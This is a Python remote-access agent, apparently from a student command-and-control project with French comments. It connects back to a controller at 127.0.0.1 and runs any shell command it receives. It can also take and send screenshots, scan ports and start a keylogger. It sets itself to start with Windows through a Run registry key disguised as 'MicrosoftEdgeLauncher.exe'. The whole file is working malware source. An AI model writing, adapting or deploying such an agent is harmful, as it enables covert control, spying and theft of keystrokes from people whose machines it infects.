import socket, subprocess, os, threading,shutil, keyboard, time
import winreg as reg
from PIL import ImageGrab
from pynput.keyboard import Listener, Key

ip_add = "127.0.0.1"
port = 3280


# Persistance

#def persistance():
#    location = r"C:\Users\droua\Documents\C2_projet\dist\agent.exe"
#    if not os.path.exists(location):
#        executable = r"C:\Users\droua\Documents\C2_projet\dist\agent.exe"
#        shutil.copyfile(executable, location)
#        subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{}"'.format(location), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def persistance():
    chemin_script = os.path.abspath(__file__)
    cle = r"Software\Microsoft\Windows\CurrentVersion\Run"
    valeur = "MicrosoftEdgeLauncher.exe"
    
    reg.CreateKey(reg.HKEY_LOCAL_MACHINE, cle)
    registre = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, cle, 0, reg.KEY_WRITE)
    reg.SetValueEx(registre, valeur, 0, reg.REG_SZ, chemin_script)
    reg.CloseKey(registre)

# Lance l'agent
def start_agent(s):
    while True:
        try:
            s.connect((ip_add, port))  # Tentative de connexion
            data_socket(s)  # Commence à recevoir et envoyer des données
            break
        except ConnectionRefusedError:
            time.sleep(5)
# Recoie et envoie des données
def data_socket(s):
    while True:
        request = s.recv(1024)
        command = request.decode("utf-8")

        if command == "capture":
            screenshot(s)

        elif command.startswith("scan"):
            try:
                _, ip, port_range = command.split()
                result = scan_port(ip, port_range)
                s.send(result.encode("utf-8"))
            except ValueError:
                # Si la commande est mal formée, envoyer un message d'erreur au serveur
                s.send(b"Invalid scan command. Use: scan <ip> <start_port>-<end_port>\n")

        elif command == "keylogger":
            start_keylogger(s)

        elif command == "help":
            help_text = """
Commandes disponibles :
    - capture : Prendre une capture d'écran de la machine cible.
    - scan <ip> <start_port>-<end_port> : Scanner les ports de l'adresse IP donnée dans la plage de ports spécifiée.
    - keylogger : Lancer le keylogger et écouter les frappes de touches sur la machine cible.
                  Stop le keylogger en appuyant sur ESC
    - stop : Arrêter l'agent sur la machine cible.
"""
            s.send(help_text.encode("utf-8"))
            
        else: 
            execute_command(s, command)


# Execute la commande
def execute_command(s, command):
    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = result.communicate()
    output = stdout.decode("cp1252", errors="replace") + stderr.decode("cp1252", errors="replace")
    # Envoi du résultat au serveur
    s.send(output.encode("utf-8"))

# Fonction de screenshot
def screenshot(s):
    try:
        screen = ImageGrab.grab()

        image_bin = screen.tobytes() # Convertir l'image en binaire
        width, height = screen.size

        # Envoyer les dimensions et les données
        s.send(len(image_bin).to_bytes(4, 'big'))
        s.send(width.to_bytes(4, 'big')) 
        s.send(height.to_bytes(4, 'big'))  
        s.send(image_bin)
    except Exception as e:
        print(f"Erreur lors de la réception ou de la sauvegarde de la capture d'écran : {e}")
        

# Fonction de scanner de port
def scan_port(ip, port_range):
    start, end = map(int, port_range.split("-"))
    results = []
    for port in range(start, end + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as port_socket:
            port_socket.settimeout(2) 
            conn_result = port_socket.connect_ex((ip, port))  # Teste de la connexion
            if conn_result == 0:
                results.append(f"Port {port} is open")
            else:
                results.append(f"Port {port} is closed")
    return "\n".join(results) 


# Demarre le keylogger et envoie les keys
def start_keylogger(s):

    def keylogger_thread():
        keylogger_log = "keylogger.txt"

        def press(key):
            with open(keylogger_log, "a") as f:
                f.write(f"{key}\n")
    
        def on_release(key):
            if key == keyboard.Key.esc:
                s.send(b"Keylogger stopped")
                return False

        with Listener(on_press=press, on_release=on_release) as listener:
            listener.join()
    
    threading.Thread(target=keylogger_thread, daemon=True).start()


if __name__ == "__main__":
    
    try:
        persistance()
    except:
        pass 

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        start_agent(s)
    except ConnectionRefusedError:
        time.sleep(5)
